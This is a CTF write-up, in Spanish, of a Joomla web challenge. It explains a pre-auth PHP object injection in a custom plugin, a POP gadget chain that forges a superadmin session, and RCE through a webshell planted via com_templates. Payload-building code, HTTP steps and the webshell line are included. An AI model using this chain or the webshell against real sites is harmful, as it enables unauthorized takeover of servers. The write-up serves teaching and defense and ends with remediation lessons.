# Provisioneds — Cyber Apocalypse CTF 2026 (web)

> La Oficina de Provisiones de Eastreach publica "avisos mensuales de suministro" con un
> plugin de Joomla hecho en casa. El plugin acepta un **libro de cuentas** (`ledger`) para
> importar… y lo deserializa tal cual.

**Categoría:** web · **Stack:** Joomla 6.1.2 + plugin de sistema `plg_system_gatehouse`
**Flag (instancia de test):** `HTB{f4k3_fl4g_f0r_t3st1ng}`

## TL;DR

Un plugin de sistema llama `@unserialize()` sobre un parámetro controlado por el atacante,
en un hook (`onAfterRoute`) que se dispara **antes** del control de sesión de admin →
**PHP Object Injection pre-auth**. Con la cadena POP de Joomla se envenena la propia sesión
para forjar un `User` superadministrador; ya como admin, `com_templates` da RCE y se lee la
flag con el binario SUID `/readflag`.

```console
$ python3 solve.py http://127.0.0.1:1337
[*] buscando el id del administrador (aleatorio por despliegue)...
[+] admin uid=176, sesion forjada
[+] flag: HTB{f4k3_fl4g_f0r_t3st1ng}
```

## Reconocimiento

El handout trae un Joomla 6.1.2 estándar más un plugin custom en
`plugins/system/gatehouse`. Casi todo el plugin es la web pública ("Ward supply updates",
carruseles, mapa de barrios): ruido temático. Lo interesante está en el `Extension`:

```php
// src/Extension/Gatehouse.php
public function onAfterRoute(AfterRouteEvent $event): void
{
    $app = $event->getApplication();
    if (!$this->isAdminImportContext($app)) return;
    $ledger = $app->getInput()->getRaw('ledger', '');
    if (!is_string($ledger) || trim($ledger) === '') return;
    (new GatehouseRepository())->importMonthlyLedger($ledger);
}

private function isAdminImportContext($app): bool
{
    if (!$app->isClient('administrator')) return false;
    $input = $app->getInput();
    return $input->getCmd('option') === 'com_provision'
        && $input->getCmd('view')   === 'dispatch'
        && $input->getCmd('task')   === 'ledger.import';
}
```

Dos detalles decisivos:

1. **`isClient('administrator')` no es autenticación.** Sólo dice que la petición va al
   cliente `/administrator/`. Un anónimo puede pedir
   `/administrator/index.php?option=com_provision&view=dispatch&task=ledger.import`.
2. `onAfterRoute` se ejecuta **antes** de que el componente exija login de superusuario, así
   que llegamos al sink sin credenciales.

Y el sink:

```php
// src/Workflow/GatehouseRepository.php
public function importMonthlyLedger(string $ledger): array
{
    if (trim($ledger) === '') return $this->result('rejected', ...);
    $data = @unserialize($ledger);           // <-- object injection
    if (!is_array($data)) return $this->result('rejected', ...);
    return $this->importMonthlyRecords($data);
}
```

`getRaw()` entrega el valor sin sanear, por lo que la cadena serializada llega intacta a
`unserialize()`. Es un object injection de manual, y **pre-auth**.

## De object injection a superadmin

Joomla 6 no expone un gadget que ejecute comandos directamente al deserializar. La técnica
ganadora es usar el POI para **envenenar la propia sesión** y colar un `User` de admin.

### El gadget escritor de sesión

- **`Joomla\Database\Mysqli\MysqliDriver::__destruct()`** llama a `disconnect()`, que hace
  `$this->connection->close()`. `connection` es una propiedad protegida que controlamos.
- Si `connection` es un **`Joomla\CMS\Session\Storage\JoomlaStorage`**, su `close()` serializa
  el `data` (privado, también controlado) hacia `$_SESSION` y cierra la sesión. En la
  práctica: **escribimos arbitrariamente los datos de nuestra sesión**.

El payload (serialización PHP a mano, ver `solve.py`) es, en esencia:

```
array( 0 => MysqliDriver{ *connection => JoomlaStorage{ data => Registry{ ... user => User{ id => UID } } } } )
```

Al terminar la petición, el destructor de `MysqliDriver` dispara la escritura de sesión con
nuestro `Registry`, que incluye un `Joomla\CMS\User\User` con el `id` del admin.

### El rehidratado

En la **siguiente** petición al panel, Joomla lee la sesión y `User::__wakeup()` recarga al
usuario desde la BD por ese id. Si el id es el del superusuario, la petición queda
autenticada como admin — sin contraseña.

### El id aleatorio y el desfase del destructor

Dos sutilezas que rompen los intentos ingenuos:

- El instalador asigna al admin un **id de usuario aleatorio** por despliegue. Hay que
  **barrer** ids (1..~1200), inyectando un `User{id}` distinto por petición y detectando
  cuándo el HTML de `/administrator/` ya está autenticado (`com_cpanel`, `task=user.logout`).
- El destructor corre **al final** de la petición: la respuesta N refleja el veneno inyectado
  en N-1. El solve compara siempre contra el id *anterior* para compensar el desfase.

```python
def payload(uid):
    user = obj(USER, [(s('id'), i(uid)), (s('guest'), i(0)), (prot('isRoot'), b(True))])
    data = registry([ ('session', ...), ('registry', registry([])), ('user', user) ])
    storage = obj(STORAGE, [(priv(STORAGE, 'data'), data)])
    driver  = obj(MYSQLI,  [(prot('connection'), storage)])
    return arr([(i(0), driver)])
```

## De admin a RCE

Con sesión de superusuario, `com_templates` permite editar los ficheros de la plantilla del
sitio. Escribimos una webshell y la invocamos:

1. `GET com_templates&view=templates&client_id=0` → id de plantilla editable.
2. `GET com_templates&view=template&id=..&file=<base64 de /offline.php>` → CSRF token +
   `jform[filename]`.
3. `POST task=template.apply` con `jform[source] = <?php system($_GET['c']); ?>`.
4. `GET <sitio>/templates/<tpl>/offline.php?c=/readflag`.

`/readflag` es SUID root y hace `cat /root/flag.txt`, así que la respuesta trae la flag.

## Exploit completo

`solve.py` automatiza todo (serialización PHP manual, barrido concurrente del id con
compensación del desfase, y el RCE por `com_templates`):

```console
$ cd challenge && docker compose up -d --build
$ python3 solve.py http://127.0.0.1:1337
[+] admin uid=176, sesion forjada
[+] flag: HTB{f4k3_fl4g_f0r_t3st1ng}
```

Contra la instancia remota basta cambiar la URL.

## Lecciones

- `unserialize()` sobre entrada de usuario sigue siendo RCE incluso en frameworks modernos:
  el propio árbol de clases de Joomla ofrece gadgets suficientes (`__destruct` →
  escritura de sesión → forjado de identidad).
- Un guard basado en "¿es el cliente administrator?" **no** es control de acceso. Combinado
  con un hook que corre antes del login, convierte una superficie "sólo admin" en pre-auth.
- Usar `getRaw()` para datos que van a `unserialize()` elimina la última red de seguridad.
  La corrección correcta es no deserializar entrada externa (usar JSON con `json_decode`,
  como de hecho hace el propio repositorio para su almacenamiento en disco).
